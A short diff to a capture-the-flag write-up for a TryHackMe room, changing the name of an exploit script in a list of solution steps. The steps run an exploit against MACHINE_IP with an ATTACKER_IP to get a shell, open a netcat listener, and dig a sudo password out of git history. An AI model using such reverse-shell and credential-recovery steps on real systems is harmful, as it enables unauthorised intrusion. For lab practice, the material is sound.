@@ -4,7 +4,7 @@ You can find the challenge here: <https://tryhackme.com/room/surfingyetiiscoming
 **WARNING**: this writeup only tells you the solution without explaining it. Only use it if you understand everything without further explanation. 
 
 
-1. run `python full_exploit.py MACHINE_IP ATTACKER_IP` to get a shell as mcskidy
+1. run `python exploit.py MACHINE_IP ATTACKER_IP` to get a shell as mcskidy
 2. in a second terminal window, run `nc -lnvp 4455`
 3. in the mcskidy shell, type `cd app` then `git show c1a0b22905cc0da0b5ad88c124125efa626013af` to find mcskidys sudo password
 4. run `cd ..`
